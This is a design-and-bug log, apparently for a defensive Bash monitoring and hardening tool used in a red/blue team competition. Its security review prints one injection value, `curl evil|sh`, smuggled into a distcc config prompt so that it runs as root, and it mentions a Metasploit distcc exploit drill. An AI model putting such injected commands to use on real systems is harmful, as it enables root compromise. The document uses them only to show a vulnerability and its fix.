# 04: Design Decisions & Bugs Found

Why the tool works the way it does, and the real defects found and fixed along the way. Useful for interviews: each item is a concrete problem, root cause, and fix.

---

## Design decisions

| Decision | Reasoning |
|---|---|
| **Single Bash file, no dependencies** | Competition boxes are locked down and may have no internet/package access. Bash + coreutils + `ss`/`ps`/`ufw`/`systemd` are already on Debian 12. One file is also trivially `scp`-able |
| **Baseline + diff instead of signature rules** | The defender doesn't know what Red will do. "Anything that wasn't there when I finished hardening" catches novel persistence with no rule updates |
| **Detect and respond are separate** | Passive dashboard can run for hours safely; destructive actions live in an explicit, confirmed console. Nothing ever auto-blocks or auto-kills, because a wrong automatic action on a scored service costs points |
| **Prompt on lock-out / scoring risks** | Disabling SSH passwords or blocking root can *fail the scored check*. The tool can't know how the scorer authenticates, so it asks and defaults to the safer answer |
| **Validate then restart, restore on failure** | `sshd -t` / `named-checkconf` before restart; original config put back if validation fails. A bad config on a scored service is worse than no hardening |
| **Archive evidence before deleting** | IR reports only score with proof; a planted account's home directory and crontab are that proof |
| **Alert once per event** | Daemon keeps `*.seen` / `*.alerted` / `*.logged` sets so one new IP or process produces one log line, not one every 5 s |
| **1 s dashboard, 5 s daemon** | Dashboard samples live (cheap) for responsiveness; daemon only needs to build history and catch persistent changes, so it runs slower to stay light |
| **Colour only on a TTY** | Escape codes in `collector.log` or systemd journal are noise; `[ -t 1 ]` gates all colour |
| **Alternate screen for the dashboard** | `\e[?1049h` keeps the user's scrollback intact; a `trap` guarantees the terminal is restored on Ctrl+C |
| **Guard rails keyed off `$SUDO_USER`** | The console can refuse the one action that would strand the operator (locking/deleting/de-sudoing themselves) |
| **Language guard acts on its own** | It is the one automatic fix in the tool. It only rewrites locale/keyboard config (never kills a process, never touches a scored service), and it saves a copy of what Red wrote first. An unreadable console during an incident costs more than an unattended config fix |
| **`f` key above the numbered menu** | If Red changes the keyboard layout or language, digit keys and menu text may be unusable. A letter key that is the same on every layout keeps the repair reachable |
| **IP block: individual IPv4, top of the chain, tagged** | Event rules forbid subnet blocks. Inserting at rule 1 beats the allow rules from `harden`; the `apollo-blocked` comment lets Apollo list and undo only its own rules |
| **Refuse to block your own session's IP** | `sudo` strips `SSH_CONNECTION`, so `own_ssh_ip` falls back to matching the tty in `who -u`. One typo would otherwise lock the operator out of the box |
| **Random passwords go to a root-only file** | Mass rotation is only useful if the team can read the new passwords, and only if nobody else can. Mode 600 file, shared passwords never written to disk, action log never records a password |
| **Flag, don't filter, in the `ps`/`ss` viewers** | Suspicious lines get a red `!` but everything else still prints, so a pattern that misses can't hide a real attacker |

---

## Bugs found and fixed

> **Provenance note:** the root causes and fixes for #1–#5 come from the script's own code comments; the exact "symptom" wording for those is a reconstruction, not a saved transcript. #6–#11 were observed directly during the 2026-09-19 practice runs. Adjust the wording to what you personally remember before using any of it in an interview.

### 1. Identical processes compared as different (`ps` padding)
- **Symptom:** `watch` reported processes as "new" that had been running since baseline.
- **Root cause:** `ps` right-pads columns to the widest value, so the same process rendered with different whitespace between samples.
- **Fix:** `procs_now` normalises with `awk` (rebuilds the command from fields) and uses `sort -u`, so text is byte-identical run to run.

### 2. The tool reported itself as "new"
- **Symptom:** every sample flagged `ps`, `sort`, `sed`, `awk`, `sleep`… and `apollo-master` itself as new processes.
- **Root cause:** the collectors' own helpers are alive while `ps` runs.
- **Fix:** `PROC_NOISE` regex excludes them; kernel threads (`PID 2` / `PPID 2`) are excluded too.

### 3. `ss … state established` shifts columns
- **Symptom:** remote IP extraction returned the wrong field.
- **Root cause:** with `state established`, `ss` **drops the State column**, so the peer address is `$4`, not `$5`.
- **Fix:** documented in code; `ips_now` uses `$4`. IPv6 handled with a bracket-aware `sed` so a naive `:port` strip doesn't eat the last hextet.

### 4. SSH hardening silently ignored (`sshd_config.d`)
- **Symptom:** `PermitRootLogin no` written to `sshd_config` but `sshd -T` still showed the old value.
- **Root cause:** Debian 12 `Include`s `sshd_config.d/*.conf` and **the first value wins**, so a drop-in can override the main file.
- **Fix:** comment out conflicting keys in drop-ins (backing them up first), insert the new value at the *top* of the main file (above any `Include`, outside any `Match` block), and print the **effective** setting via `sshd -T` so the operator sees the truth, not the file.

### 5. Duplicate BIND directives on re-run
- **Symptom:** running `harden` twice appended `recursion no;` twice; `named-checkconf` failed.
- **Fix:** if a single-line directive exists, `sed`-replace it in place; only insert after `options {` when absent. Idempotent.

### 6. distcc allow-list edit unsafe for CIDR / broke the scored check
- **Symptom (first practice run):** `ALLOWEDNETS="127.0.0.1"`, so the scorer would be refused.
- **Fixes:** the prompt now takes the scorer's IP or subnet (space-separated), the sed edit is CIDR-safe (`|` delimiter), and the prompt warns that anything not listed is refused.

### 7. UFW allowed DNS over UDP only
- **Symptom:** large DNS answers (truncated → TCP retry) would fail.
- **Fix:** `ufw allow 53` with no protocol opens both UDP and TCP.

### 8. Nothing was watching after hardening
- **Symptom:** first practice run had `harden` only, with no baseline, no daemon.
- **Fix:** `harden` ends by telling the operator the next step; `start` and `view` warn loudly if there is no baseline.

### 9. Empty HTTP-DNSGui password when input was piped
- **Symptom:** during a scripted (non-interactive) run `htpasswd` prompted, stdin was exhausted, the credential became empty and `admin:admin` stopped working.
- **Lesson:** credential steps must be interactive. Documented as a prompt note in [02-mode-reference](02-mode-reference.md). *Open improvement: reject a blank password.*

### 10. Misleading "Password login left enabled" message
- **Symptom:** answering **N** printed "left enabled" while `sshd -T` showed `passwordauthentication no`.
- **Root cause:** N means "leave as-is", and the practice snapshot already had it off.
- **Impact:** the packet accounts (which use passwords) could not SSH in.
- **Status:** found during testing; the effective-settings printout exposed it. *Open improvement: warn when the effective value is `no` after an N answer.*

### 11. `passwd -S` is one-user-at-a-time
- **Symptom:** early console test passed two users to `passwd -S` and printed usage.
- **Fix:** loop per user.

---

### 12. Changes made outside the console were invisible / unattributed
- **Symptom:** a password changed with plain `chpasswd`/`passwd` produced no log line anywhere the console showed; the diff only said "`/etc/shadow` changed" with no user name. The daemon wasn't running, so nothing was logging at all.
- **Root cause:** `actions.log` only records actions taken *through* the console, and the baseline diff works on whole-file hashes.
- **Fix:** `pwd_track` fingerprints each account's hash and logs `PASSWORD CHANGE: <user>` / `PASSWORD SET (new account): <user>` with a timestamp. The daemon runs it every 5 s; the console runs it on every redraw. Menu option 8 became an **Activity log** (console actions + detected changes) and the console header shows daemon status with a warning when nothing is watching.

### 13. Timestamps in UTC didn't match the operator's clock
- **Symptom:** a password changed at 12:49 PM showed as 4:49 PM.
- **Root cause:** the box runs on UTC; Linux stores only the *date* of a password change, so the time had to be recorded by the tool itself.
- **Fix:** one formatting helper set (`fmt_ts`, `now_stamp`, `who_pretty`) and an `APOLLO_TZ` setting (default `America/New_York`, overridable) exported as `TZ`, so tables, logs, dashboard clock and `who` all agree.

### 14. distcc attack attempts were invisible to the monitor
- **Symptom:** ran a real red-team drill from a Kali VM on the same subnet against Apollo's distcc (port 3632), including a Metasploit `distcc_exec` (CVE-2004-2687) attempt. `nmap`, `curl` and SSH attempts were all logged one way or another, but the distcc probes left **zero trace** anywhere Apollo showed — even though distccd's own log (`/var/log/distccd.log`) recorded every one of them.
- **What the drill found (real, useful result):** the exploit itself **failed**: distccd logged `dcc_check_compiler_whitelist: CRITICAL! sh not in /usr/lib/distcc … whitelist`, meaning Debian 12's distcc build already mitigates the classic arbitrary-command exploit with a compiler whitelist. The connection resets Metasploit reported were distccd refusing the payload, not a network problem.
- **Root cause:** Apollo's collectors never looked at `distccd.log`; the daemon watched processes, IPs and accounts, but not that file.
- **Fix:** `distcc_new_alerts` tails `/var/log/distccd.log` from a saved byte offset (`distccd.log.pos`), filtering to only the lines that mean *rejected/malformed*: `CRITICAL!` (whitelist rejection), `REJ_BAD_REQ`, `magic fairy dust` (protocol mismatch), so legitimate compiles never show up. `distcc_log_new` appends each new hit to `collector.log` as `DISTCC ATTACK: <line>`, timestamped. Both the daemon (every 5 s) and the console (on open) call it, so it's caught even without the daemon running. The position file is seeded to the log's *current* size the first time the daemon starts, so pre-existing history isn't dumped as "new"; only genuinely new activity is flagged.
- **Verified:** reset tracking, sent a fresh probe from Kali, and the daemon logged it within seconds; repeated with the daemon stopped and the console still caught it on open.

## Security review, 2026-09-19 (read through the whole script + verified against the box)

The tool detects attacks; that doesn't make the tool itself safe. A line-by-line read plus checking assumptions against the real box found one confirmed root-level bug and several lower-severity ones.

### 15. [HIGH, CONFIRMED] Root shell injection via the `harden` distcc prompt
- **What:** `harden` writes the typed distcc allow-list straight into `/etc/default/distcc` with no sanitization, then immediately restarts distcc.
- **Verified root cause:** `/etc/init.d/distcc` line 50 — `[ -r /etc/default/distcc ] && . /etc/default/distcc` — **sources that file as shell, as root**, every time distcc (re)starts. A value like `<SUBNET_CIDR>"; curl evil|sh; x="` becomes literal shell code that runs as root the moment `harden` restarts the service — in the same run that wrote it.
- **Fix:** the prompt now loops, rejecting anything outside `[0-9a-fA-F:./, ]` (valid IPv4/IPv6/CIDR characters) and re-asking, instead of writing whatever was typed.
- **Verified:** fed the exact payload above to `harden`; it was rejected and re-prompted, `/root/PWNED` (the payload's marker) was never created, and the final `/etc/default/distcc` was clean with `ALLOWEDNETS="<SUBNET_CIDR>"`.

### 16. [MEDIUM] Blank HTTP-DNSGui password was still possible
- Bug #9 documented this but never fixed the code. `htpasswd`'s own prompt silently accepts empty input from a non-interactive/exhausted stdin.
- **Fix:** the script now reads the password itself (`read -s`, twice, must match, must be non-empty) and passes it to `htpasswd -b`, instead of trusting `htpasswd`'s own prompt.
- **Verified:** re-ran `harden`; a blank first attempt would be rejected (loop), a real password was accepted, and the panel authenticates with it (`200`) while `admin:admin` fails (`401`).

### 17. [MEDIUM] Self-lockout protections silently stop working if `$SUDO_USER` is unset
- The console refuses to lock/delete/de-sudo `$CALLER` (`${SUDO_USER:-root}`). If you reach a root shell some other way — `sudo su -` then run the script, an existing root shell, a cron/systemd context — `$SUDO_USER` is unset and `CALLER` silently becomes the literal string `"root"`, which no longer matches the real human operator. The protection doesn't error; it just quietly stops protecting *you*.
- **Fix:** when root with no `$SUDO_USER`, the console now prints an explicit warning naming the risk and suggesting a fresh `sudo bash apollo-master.sh monitor` instead.

### 18. [MEDIUM] Unlocked race on shared temp files (daemon + open console at once)
- `pwd_track` and `distcc_log_new` both wrote to one **fixed** temp filename (`pwd.track.tmp`, and an implicit shared position update). If the daemon's 5-second tick and an open `monitor` console's redraw landed at the same moment, one process's write could interleave with or clobber the other's; worst case, a corrupted `pwd.track`; best case, a duplicate log line.
- **Fix:** both now write to a PID-suffixed temp file (`pwd.track.tmp.$$`, `distccd.log.pos.$$`) and `mv` it into place, so two writers can never share one temp file.

### 19. [LOW] `watch -n <value>` didn't validate `<value>`
- A typo (`-n abc`) made `sleep` fail every iteration with no delay, so the loop would re-run the full snapshot (including a `find /` for SUID files) as fast as it could, forever.
- **Fix:** `-n` now must be a positive whole number or the script refuses immediately with a clear message.

## Known gaps (honest list)

- `install`/systemd path and a reboot were **not** exercised.
- Processes that live < 5 s can be missed by the daemon (the dashboard samples every 1 s, so it may still catch them).
- `distccd` may still run as root, and the script only warns.
- The HTTP-DNSGui step assumes nginx + `/etc/nginx/.htpasswd` (practice-box layout); the real Apollo panel may differ.
- IP blocking is IPv4 only, and a block may not cut connections that are already established.
- The suspicious-line patterns for `ps`/`ss` are a hand-written list of common tells. Red can avoid them, so a clean tree is not proof of a clean box.
- The v2.1 features (IP block, mass password change, viewers, language guard) have no recorded practice-VM test results yet.
- The console does not manage `authorized_keys`.
- Password/account changes are attributed to the *account*, not to who made them.
- Without the daemon, detected-change times are "when the console noticed", not when it happened.
- distcc detection assumes the log path `/var/log/distccd.log`; a different distcc build/path on the real box would need that constant updated.
- **Still open, not yet fixed:** typed usernames/process names aren't guarded with `--` before `passwd`/`gpasswd`/`pgrep`, so a name starting with `-` could be misread as an option (low risk, since only the console operator types these). The generated systemd unit's `ExecStart=` line isn't quote-safe if the script ever lives at a path containing a space. The `sshd_config.d` neutralizer comments out matching keys everywhere, including inside `Match` blocks, which would break a box that legitimately relies on per-user SSH overrides (not the case on Apollo). `$BASE_DIR`/`$MON_DIR` rely on `/root`'s own `0700` permissions rather than setting their own.
- **Design-level, not fixable by more code:** the script trusts its own file. Whoever can write it — i.e., whoever controls the `<user>` account — gets root the next time it runs, since it's invoked via `sudo` and, once `install`ed, by a root systemd unit. That's true of nearly any script run this way; worth knowing rather than assuming the tool "protects" the box from its own operator's account being compromised.
